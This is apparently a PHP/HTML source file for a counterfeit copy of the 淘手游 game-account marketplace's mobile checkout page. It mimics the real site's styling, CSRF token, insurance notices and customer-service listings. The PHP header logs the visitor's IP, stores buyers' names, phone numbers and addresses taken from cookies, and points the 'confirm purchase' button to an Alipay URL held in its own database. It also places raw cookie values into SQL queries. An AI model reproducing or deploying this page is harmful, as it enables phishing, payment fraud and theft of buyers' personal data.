<!DOCTYPE html>
<?php
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);


if($_COOKIE['GoodsID3']){
    


	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);


	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');

		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE
				useraddress
			SET
				state=2,
				utime='{$_CURRENT_TIME2}'
			WHERE
				gid='{$_COOKIE['GoodsID3']}' LIMIT 1") or die(mysql_error());


		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE
					  useraddress
				  SET
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE
					  gid='{$_COOKIE['GoodsID3']}' LIMIT 1");

			}
		}
		  _close();
		  session_destroy();

	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

?>
<html lang="zh-CN" class="ui-mobile">
    
    <head><base href="">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
<meta name="screen-orientation" content="portrait">
<meta name="x5-orientation" content="portrait">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="csrf-param" content="_csrf">
<meta name="csrf-token" content="xQ6vG3REAuoYw1OESkis0fAx3UN57s98imTJeke9yaToR8V5THFB022uFNYAcZSIgGGyGSvYvgnsK_suPv--4g==">
        <meta name="author" content="淘手游交易平台">
        <title><?php echo $_GoodsID['title'];?></title>
        <link href="http://m.taoshouyou.com/css/jquery.mobile-1.4.5.min.css" rel="stylesheet">
        <link href="http://m.taoshouyou.com/css/site.css?v=20180403" rel="stylesheet">
        <meta keywords="">
<link href="http://m.taoshouyou.com/css/user/buy/validationEngine.jquery.css" rel="stylesheet">
<link href="http://m.taoshouyou.com/css/user/buy/trade.css?0.8" rel="stylesheet">
<link href="http://m.taoshouyou.com/js/user/selltrade/lib/weui.min.css" rel="stylesheet">    </head>
        <body class="ui-mobile-viewport ui-overlay-a"><div data-role="page" data-url="http://m.taoshouyou.com/user/buy/trade" tabindex="0" class="ui-page ui-page-theme-a ui-page-active" style="min-height: 812px;">
        






<style>
    #face-box {
        position: fixed;
        z-index: 9999;
        width: 100%;
        height: 100%;
        overflow: auto;
        display: none;
    }

    .face-mask {
        position: fixed;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: #000;
        z-index: 99998;
    }

    .face-contont {
        background: #f7f7f7;
        position: fixed;
        padding: 10px 0;
        height: 100%;
        z-index: 99999;
        display: none;
        top: 0;
        bottom: 0;
        width: 100%;
    }

    .face-title {
        margin-bottom: 40px;
        text-align: center;
        position: relative;
        font-size: 18px;
        font-family: PingFangSC-Medium, PingFang SC;
        font-weight: 600;
        color: #333333;
    }

    .face-title img {
        position: absolute;
        left: 25px;
        width: 28px;
        height: 28px;
        top: -2px;
    }

    .sketch {
        padding: 0 80px;
    }

    .sketch-img img {
        width: 100%;
    }

    .sketch-text {
        font-size: 14px;
        color: #999;
        letter-spacing: 0;
        line-height: 24px;
        text-align: center;
    }

    .prompt-box {
        padding: 40px 0 20px;
    }

    .prompt-box-text {
        margin: 0 45px 30px;
        height: 18px;
        line-height: 18px;
        width: 300px;
    }

    .prompt-box-text-number {
        border-radius: 200px;
        text-align: center;
        color: #fff;
        background: #ff0040;
        display: inline-block;
        width: 16px;
        height: 16px;
        line-height: 16px;
        box-sizing: border-box;
        font-size: 12px;
        margin-right: 10px;
        letter-spacing: 0;
        vertical-align: top;
    }

    .prompt-box-text-content {
        font-size: 14px;
        font-family: PingFangHK-Regular, PingFangHK;
        font-weight: 400;
        color: #666666;
    }

    .prompt-box-text-border {
        height: 6.5px;
        margin: 5px 0 5px 7.5px;
        width: 0;
        border-left: 1px dotted #ff5858;
        display: block;
    }

    .prompt-next {
        margin: 0 45px;
        height: 48px;
        line-height: 48px;
        text-align: center;
        background: linear-gradient(307deg, #FF0040 0%, #FF4F85 100%);
        border-radius: 25px;
        color: #fff;
        display: block;
        font-size: 16px;
        outline: none;
        border: none;
    }

    .btn-box-face {
        position: relative;
    }

    .camera-input {
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0;
    }

    .realname-contont {
        position: absolute;
        top: 50%;
        background: #fff;
        margin: 0 auto;
        left: 20px;
        right: 20px;
        border-radius: 12px;
        z-index: 99999;
        margin-top: -220px;
        /* display: none; */
    }

    .title-rn {
        color: #fff;
        text-align: center;
        height: 159px;
        position: relative;
    }

    .title-rn .tx {
        position: absolute;
        width: 144px;
        left: 50%;
        margin-left: -72px;
        top: 0;
        margin-top: -72px;
        display: inline-block;
    }

    .title-rn .bg {
        width: 100.3%;
        height: 159px;
        vertical-align: middle;
    }

    .title-rn .face-tips {
        position: absolute;
        padding: 0 20px;
        top: 30px;
        font-size: 20px;
        font-family: PingFangSC-Regular, PingFang SC;
        font-weight: 400;
    }

    .title-rn .face-tips .text-tips {
        text-align: left;
        font-size: 12px;
        font-family: PingFangSC-Regular, PingFang SC;
        font-weight: 400;
        margin-top: 20px;
    }

    .tips-bottom {
        font-size: 12px;
        font-family: PingFangSC-Regular, PingFang SC;
        font-weight: 400;
        color: #666666;
        margin: 15px 0;
    }

    .contont-box-rn {
        padding: 0 20px;
    }

    .face-input-box {
        height: 50px;
        background: #FFFFFF;
        border-radius: 12px;
        border: 1px solid #C3E1FF;
        line-height: 50px;
        padding: 0 10px;
        margin: 15px 0;
    }

    .face-input-box input {
        width: 100%;
        background: none;
        outline: none;
        border: none !important;
        padding: 10px;
        font-size: 16px;
        color: #293544;
    }

    .btn-rn {
        font-size: 16px;
        font-family: PingFangSC-Regular, PingFang SC;
        color: #fff;
        margin: 30px 0;
        text-align: center;
        height: 44px;
        line-height: 44px;
        border-radius: 12px;
        background: linear-gradient(151deg, #3153F8 0%, #176EFF 100%);
    }

    .btn-close {
        position: absolute;
        bottom: -50px;
        height: 30px;
        left: 50%;
        margin-left: -15px;
    }

    .face-proposal {
        color: #ff0040;
        margin-top: 15px;
        font-size: 14px;
        text-align: center;
    }

    #face-setp1 {
        /* display: none; */
    }

    #face-setp2 {
        display: none;
        text-align: center;
    }

    #face-setp2 img {
        margin: 50px auto 20px;
    }

    #face-setp3 {
        display: none;
        text-align: center;
        font-size: 18px;
        font-family: PingFangSC-Medium, PingFang SC;
        font-weight: 600;
        color: #333333;
    }

    #face-setp3 img {
        width: 205px;
    }

    #face-setp3 .fail-tips {
        font-size: 14px;
        font-family: PingFangSC-Regular, PingFang SC;
        font-weight: 400;
        color: #FF0040;
        margin-top: 20px;
    }

    #face-setp3 .fail-box {
        display: flex;
        margin-top: 80px;
        padding: 0 25px;
    }

    #face-setp3 .fail-box div {
        flex: 1;
        height: 40px;
        border-radius: 25px;
        line-height: 40px;
        font-size: 16px;
        font-family: PingFangSC-Medium, PingFang SC;
        font-weight: 600;
    }

    #face-setp3 .fail-cancel-btn {
        margin-right: 10px;
        border: 1px solid #979797;
        box-sizing: border-box;
        color: #333333;
    }

    #face-setp3 .fail-again-btn {
        position: relative;
        color: #FFFFFF;
        margin-left: 10px;
        background: linear-gradient(307deg, #FF0040 0%, #FF4F85 100%);
    }

    .face-error-msg {
        margin-top: 10px;
        font-size: 14px;
        color: #ff0040;
    }

    #face-box :-moz-placeholder {
        text-align: left !important;
    }

    #face-box ::-moz-placeholder {
        text-align: left !important;
    }

    #face-box :-ms-input-placeholder {
        text-align: left !important;
    }

    #face-box ::-webkit-input-placeholder {
        text-align: left !important;
    }
</style>


    <div class="header" id="app_header">
        <!-- <a href="/im/im?tradeid=41816290" style="display: block;"><div class="header_back"><div class="header_back_r"></div></div></a> -->
        <a href="javascript:history.back(-1)" style="display: block;" class="ui-link"><div class="header_back"><div class="header_back_r"></div></div></a>
            确认订单
                            <div class="gb-head-rightwrap">
                    <div class="header_right">
                        <img src="http://m.taoshouyou.com/img/head/headsearch.png" class="js-help-index-btn">
                        <a href="/" data-ajax="false" class="ui-link">
                            <img src="http://m.taoshouyou.com/img/head/home.png?t=123" style="width:20px;height:18px;margin-top:14px;">
                        </a>
                    </div>
                </div>
                </div>
    
<section class="err-bg"></section>
<!--基本信息-->
<div class="warp" style="height:100%;padding-bottom: 55px;">
    <input type="hidden" id="is_kuaifa" value="0">
    <input type="hidden" id="new_insurance_price_box" vlaue="1">
    <input type="hidden" id="insurance_type" value="0" data-status="1">
    <input type="hidden" id="baiduStatistic_ganame" value="王者荣耀">
    <div class="js-insurance-alert-box">
		<div class="js-insurance-box1">
			<h2>交易安全险</h2>
			<p class="insurance-tips">
				<span class="">96.9%</span>
				<span>的用户在下单时都会选择购买保险</span>
			</p>
			<p class="insurance-tips1">(保费在交易成功时才会收取)</p>
			<div class="insurance-describe-box">
				<p>更多情报：</p>
				<p>1.投保订单发生找回将全额赔付</p>
				<p>2.官方数据: 90天内不被找回的账号基本永久安全</p>
			</div>
			<div class="insurance-bnt-box">
				<div class="fl no-insurance">暂不投保</div>
				<div class="confirm-insurance fr">确认投保</div>
			</div>
		</div>
	</div>
                <form class="orderform" action="http://m.taoshouyou.com/user/buy/tradelogcreate" method="post" id="orderform">
    		<input type="hidden" id="goodsmodel" value="账号">
		<input type="hidden" id="tradeid" name="tradeid" value="41816290">
        <input type="hidden" id="originalprice" value="<?php echo $_GoodsID['price'];?>.00">
		<input type="hidden" id="goodsid" name="goodsid" value="1">
		<input type="hidden" name="_csrf" value="xQ6vG3REAuoYw1OESkis0fAx3UN57s98imTJeke9yaToR8V5THFB022uFNYAcZSIgGGyGSvYvgnsK_suPv--4g==">
                    <div class="new_goods_box">
                <input type="hidden" id="goods_price" value="<?php echo $_GoodsID['price'];?>.00">
                <input type="hidden" id="goods_insurance_type" value="60">
                <input type="hidden" name="amount" data-price="<?php echo $_GoodsID['price'];?>.00" data-truecount="1" value="1">
                <div class="first_box">
                    <img src="<?php echo $_GoodsID['goods_img1'] ?>">
                </div>
                <div class="end_box">
                    <div class="goods_name"><?php echo $_GoodsID['title'];?></div>
                    <div class="goods_price">
                        <span class="model_box">
                                                                                                <span class="yitoubao">已投保</span>
                                                                                    </span>
                        <span class="price_box"><b>￥</b><?php echo $_GoodsID['price'];?>.00</span>
                    </div>
                </div>
            </div>
                        <div class="new_insurance_box">
                <input type="hidden" id="baoxian1" value="18.0">
                <input type="hidden" id="baoxian2" value="20.0">
                <input type="hidden" id="baoxian3" value="">
                <input type="hidden" id="baoxian_type1" value="60">
                <input type="hidden" id="baoxian_type2" value="90">
                <input type="hidden" id="baoxian_type3" value="">
                                <div class="new_title">
                    <div>交易安全险
                        <span>中国人寿承保，账号找回也不怕</span>
                    </div>
                </div>
                                   
                                            <div class="new_insurance_price_box">
                            <div class="insurance_type_box">
                                <img class="img-guoshou" src="http://m.taoshouyou.com/img/insurance/guoshou.png">
                                                                    <span class="insurance_date">60天保险</span>
                                                            </div>

                            
                            <div class="new_insurance_price" style="right: 30px;" data-must_buy_insurance="1">                                                           
                                                                    <span class="insurance_price">卖家已为该商品投保</span>
                                                            </div>
                        </div>
                                                    <div class="notice">
                                            <span>温馨提示：</span>卖家已为商品投保，如出现商品被找回，被封号，最高可赔付您所购买的订单金额。 
                        <a href="http://m.taoshouyou.com/help-505-503.html?tradeid=41816290" style="float:none" id="js-buy-note" class="bx-blue ui-link">《购买须知》</a>
                        <a href="http://m.taoshouyou.com/help-751-503.html?tradeid=41816290" style="float:none" id="js-safe-trade" class="bx-blue ui-link">《安全交易险》</a>。
                                    </div>
            </div> 
            <input type="hidden" id="is_baoxian" value="1">
                        <div class="new_insurance_box" style="padding-bottom: 15px;">
                <div class="new_title">
                    <div>交易客服
                        <span>系统为您推荐的交易客服</span>
                    </div>
                </div>
                <div class="pro_content_info kefu" id="new_kefu">
                    <div class="kefu-normal hidden js-choose-kefu" id="js-kefu-choose">
                        <img src="/img/insurance/kefu.png" class="img-guoshou">
                        暂未选择客服
                        <span class="choose" style="color:#ff0040">请选择客服</span>
                    </div>   
                    <div class="kefu-sel hidden js-choose-kefu show" id="js-kefu-checked">
                        <div class="kefu-checked">
                            <span class="img-box"><img src="./img/kf.png"></span>
                            <span class="name">客服-奶糖</span>
                            <span class="icon-r js-choose-kefu"></span>
                            <span class="status status-1">空闲</span>                    
                        </div>
                        <b class="kefu-tips" style="display: none;">客服忙碌中，处理订单需等待～</b>
                    </div>             
                </div>
            </div>
            <div class="new_insurance_box" style="padding-bottom: 15px">
                <div class="new_title">
                    <div>联系方式</div>
                </div>
                <div>
                    <div class="pro_content_info new_pro_content_info">
                        手机号码：
                        <input type="text" id="buyermobile" name="buyermobile" data-validation-engine="validate[required,custom[mobile]]" class="pro_content_info_text" placeholder="请输入手机号码" data-role="none" value="" required="">
                    </div>
                    <div class="pro_content_info new_pro_content_info">
                        QQ号码：
                        <input type="text" id="buyerqq" name="buyerqq" data-validation-engine="validate[required,custom[qq]]" class="pro_content_info_text" placeholder="请填写您能接收消息的QQ号码" data-role="none" value="">
                    </div>
                </div>
            </div>
            <div class="new_insurance_box" style="padding: 16px 18px;height:85px">
               点击确认购买表示您已阅读、理解并同意
               <a class="bx-blue ui-link" href="https://m.taoshouyou.com/help-673-347.html">《网络虚拟财产转让协议》</a>
               <a class="bx-blue ui-link" href="https://m.taoshouyou.com/help-702-347.html">《交易风险提示、安全措施及免责声明》</a>
               <a class="bx-blue ui-link" href="https://m.taoshouyou.com/help-671-347.html">《淘手游售后纠纷仲裁规则》</a>
            </div>
            <div id="btn_box">
                <div class="mingxin_box">
                    <div>明细 <span class="jiantou"><img src="http://m.taoshouyou.com/img/insurance/up.png" style="width: 20%;"></span></div>
                    <div style="margin-left: 15px;">合计：<span style="font-size: 10px;">￥</span><span class="tprice red" style="font-size: 16px;"><?php echo $_GoodsID['price'];?>.00</span></div>
                </div>
                <div class="pro_subbtnbox" data-facetradeid="41816290">
                    <a href="<?php echo $_GoodsID['zhifubaoURL']; ?>" data-rel="popup" data-position-to="window" data-transition="pop" data-facetradeid="41816290" data-goodsid="1" id="submit" trademodel-goodsid="1" goodsmodel-id="1" class="js-submit ui-link" >确认购买</a>
                </div>
            </div>
            <div class="module" id="newmodule">
                <div class="pro_content_info">
                    <div><p class="promptemail">操作过于频繁，验证码获取失败，请一分钟后再试</p></div>
                </div>
            </div>
            <div class="new_goodsnum">
                <div id="goodsnum">1</div>
                <div class=" ui-checkbox"><div class=" ui-checkbox"><input checked="" name="agreeterms" id="agreeterms" data-validation-engine="validate[required] checkbox" type="checkbox" style="opacity: 0 !important;left: 200px !important;"></div></div>
            </div>
            <div class="datail-box" id="datail-box" data-type="hide" style="display: none;">
                <div>
                    <span>商品金额</span>
                    <span><?php echo $_GoodsID['price']; ?>.00</span>
                </div>
                <div>
                    <span>保险费</span>
                    <span class="baoxian_money" id="js-bx-money">0</span>
                </div>
                <div>
                    <span>客服费</span>
                    <span class="kf_price">0</span>
                </div>
                <div>
                    <span></span>
                    <span>小计 
                        <b class="tprice"><?php echo $_GoodsID['price']; ?>.00</b>
                   </span>
                </div>
            </div>
                <!-- 执行隐藏域 -->
        <div class="js-p-pay-payment-hidebox" style="visibility:hidden;height:0;width:0;overflow:hidden;"></div>
        <div class="online-pay-wrap">
            <div class="online-pay">
                <h3>用户提醒</h3>
                <div class="content">
                    <p>您的账户余额不足，立即跳转到在线支付页面？</p>
                    <p class="notic">*若订单信息填写错误造成任何后果由买家自行承担</p>
                </div>
                <div>
                    <a id="online-pay-close" class="ui-btn ui-corner-all ui-shadow ui-btn-inline">取消</a>
                    <a href="#" id="btn_check_buy" class="ui-btn ui-corner-all ui-shadow ui-btn-inline ui-btn-active " data-transition="flow">确认</a>
                </div>
            </div>
        </div>
            
                <div class="service-warp" style="display: none;">
            <div class="service-blank js-closed-service">
            </div>
            <div class="service-choose">
                <h2 class="tab-parent-title hidden ">
                    <span class="checked" name="recommend">推荐客服<i></i></span>
                    <span class="last" name="other-service">其他客服<i></i></span>
                </h2>
                <div id="recommend" class="recommend-service service-kefu hidden ">
                    <ul class="tablist-left">
                                                                    </ul>
                    <div id="y200" class="tablist-content-1 hidden ">
                        <div class="pro_service_m" data-id="stj1" data-price="">                                 
                            <div class=" ui-radio"><div class=" ui-radio"><div class=" ui-radio"><input id="service" class="stj1" name="service" data-validation-engine="validate[required]" type="radio" value="" data-cacheval="false"></div></div></div>
                            <div class="left"><img src="https://img2.taoshouyou.com/img/avatar-mid-img.png" alt="" width="64" height="64" title=""></div>
                            <ul class="left">
                                <li class="title"><sapn class="kefu-name"></sapn><span class="status status-2" data="" data-title="忙碌">忙碌</span></li>
                                <li><b title="级安全评估" class="v-lv lv"></b></li>
                                <li class="title note">服务费：<span class="service-price"></span>元</li>                      
                            </ul>
                            <p><span class="pro_service_m_msg">个月服务<span class="pro_service_m_num"></span>笔订单</span><span class="good">好评率：未评</span></p>
                            <p class="impression">卖家印象：</p>
                        </div>
                    </div>
                    
                    <div id="y202" class="tablist-content-1 hidden ">
                                            </div>
                
                </div>

                
                                                <div id="y10" class="tablist-content">
                                                            <div class="js_pro_service_m pro_service_m " data-id="s100" data-price="10">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s100" name="service" data-validation-engine="validate[required]" type="radio" value="617" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-04-29/25/c72591867cffd831a438e5a3e4f682f9.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-哈哈</sapn><span class="status status-1" data="1" data-title="空闲">空闲</span></li>
                                        <li><b title="4级安全评估" class="v-lv lv4"></b></li>
                                        <li class="title note"><span>服务至上，效率争先！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">15个月服务<span class="pro_service_m_num">8103</span>笔订单</span><span class="good">好评率：99%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                    </div>                            
                                                            <div class="js_pro_service_m pro_service_m  odd" data-id="s101" data-price="10">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s101" name="service" data-validation-engine="validate[required]" type="radio" value="873" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2021-03-30/1/8b7d631238f78395780471baa47244ba.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-唯怡</sapn><span class="status status-1" data="1" data-title="空闲">空闲</span></li>
                                        <li><b title="4级安全评估" class="v-lv lv4"></b></li>
                                        <li class="title note"><span>用一颗真挚的心，带给您真诚的服务</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">15个月服务<span class="pro_service_m_num">8950</span>笔订单</span><span class="good">好评率：99%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                    </div>                            
                                                            <div class="js_pro_service_m pro_service_m " data-id="s102" data-price="10">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s102" name="service" data-validation-engine="validate[required]" type="radio" value="619" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-04-29/13/217f3a9ecf4c03986d86282d8c2830dd.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-乔治</sapn><span class="status status-1" data="1" data-title="空闲">空闲</span></li>
                                        <li><b title="4级安全评估" class="v-lv lv4"></b></li>
                                        <li class="title note"><span>用心为客客心留！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">13个月服务<span class="pro_service_m_num">7720</span>笔订单</span><span class="good">好评率：99%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m  odd" data-id="s103" data-price="10">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s103" name="service" data-validation-engine="validate[required]" type="radio" value="648" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/4/2d65fde2d787ca3926fe6af8d5574743.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-雨丫头</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="4级安全评估" class="v-lv lv4"></b></li>
                                        <li class="title note"><span>等您选我哟~</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">16个月服务<span class="pro_service_m_num">9003</span>笔订单</span><span class="good">好评率：99%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m " data-id="s104" data-price="10">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s104" name="service" data-validation-engine="validate[required]" type="radio" value="649" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/16/eb226fea6942efe8486cbc70dae2471a.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-丫丫</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="4级安全评估" class="v-lv lv4"></b></li>
                                        <li class="title note"><span>很高兴为您服务！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">20个月服务<span class="pro_service_m_num">11328</span>笔订单</span><span class="good">好评率：99%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m  odd" data-id="s105" data-price="10">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s105" name="service" data-validation-engine="validate[required]" type="radio" value="650" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/13/5cfe9bbe7a746c9ebe14e2c986ff4c4b.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-卓林</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="4级安全评估" class="v-lv lv4"></b></li>
                                        <li class="title note"><span>专业、快速、热情！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">16个月服务<span class="pro_service_m_num">8999</span>笔订单</span><span class="good">好评率：99%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                             
                        </div>
                                                <div id="y8" class="tablist-content">
                                                            <div class="js_pro_service_m pro_service_m " data-id="s80" data-price="8">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s80" name="service" data-validation-engine="validate[required]" type="radio" value="872" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2019-10-09/29/90a3f401202d5830c9dafc7c8042b262.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-丸子</sapn><span class="status status-1" data="1" data-title="空闲">空闲</span></li>
                                        <li><b title="3级安全评估" class="v-lv lv3"></b></li>
                                        <li class="title note"><span>用我百分百的努力，换你百分百的满意</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">9个月服务<span class="pro_service_m_num">4580</span>笔订单</span><span class="good">好评率：98%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                    </div>                            
                                                            <div class="js_pro_service_m pro_service_m  odd" data-id="s81" data-price="8">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s81" name="service" data-validation-engine="validate[required]" type="radio" value="631" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-04-29/2/1b2fd8bb114fff352ac486acbc9ee265.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-晴晴</sapn><span class="status status-1" data="1" data-title="空闲">空闲</span></li>
                                        <li><b title="3级安全评估" class="v-lv lv3"></b></li>
                                        <li class="title note"><span>您的满意就是我的动力！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">10个月服务<span class="pro_service_m_num">5325</span>笔订单</span><span class="good">好评率：98%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                    </div>                            
                                                            <div class="js_pro_service_m pro_service_m " data-id="s82" data-price="8">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s82" name="service" data-validation-engine="validate[required]" type="radio" value="639" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-04-29/16/b662efd1fdb1c4c7c258b066120af713.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-宇涵</sapn><span class="status status-1" data="1" data-title="空闲">空闲</span></li>
                                        <li><b title="3级安全评估" class="v-lv lv3"></b></li>
                                        <li class="title note"><span>心贴心的服务!</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">8个月服务<span class="pro_service_m_num">3985</span>笔订单</span><span class="good">好评率：98%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m  odd" data-id="s83" data-price="8">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s83" name="service" data-validation-engine="validate[required]" type="radio" value="645" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/23/77bce6c6083ff639349694cfa8051b95.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-敏敏</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="3级安全评估" class="v-lv lv3"></b></li>
                                        <li class="title note"><span>服务于心，行动于情~</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">10个月服务<span class="pro_service_m_num">5266</span>笔订单</span><span class="good">好评率：98%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m " data-id="s84" data-price="8">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s84" name="service" data-validation-engine="validate[required]" type="radio" value="646" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/17/c67b5dfe0644c81eb5e7264592399903.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-滋滋</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="3级安全评估" class="v-lv lv3"></b></li>
                                        <li class="title note"><span>加油~加油~</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">10个月服务<span class="pro_service_m_num">5221</span>笔订单</span><span class="good">好评率：98%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m  odd" data-id="s85" data-price="8">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s85" name="service" data-validation-engine="validate[required]" type="radio" value="647" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-04-29/8/d3c7be023037ffa06aee569941f9e2b2.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-娇子</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="3级安全评估" class="v-lv lv3"></b></li>
                                        <li class="title note"><span>微笑、热情、耐心！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">11个月服务<span class="pro_service_m_num">5817</span>笔订单</span><span class="good">好评率：98%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                             
                        </div>
                                                <div id="y0" class="tablist-content">
                                                            <div class="gray js-un-choose-service  pro_service_m " data-id="s00" data-price="0">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s00" name="service" data-validation-engine="validate[required]" type="radio" value="871" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2019-10-09/11/129e792e5739503dd8f4ccb0428f06dc.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-宇珠</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="1级安全评估" class="v-lv lv1"></b></li>
                                        <li class="title note"><span></span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">3个月服务<span class="pro_service_m_num">985</span>笔订单</span><span class="good">好评率：96%</span></p>
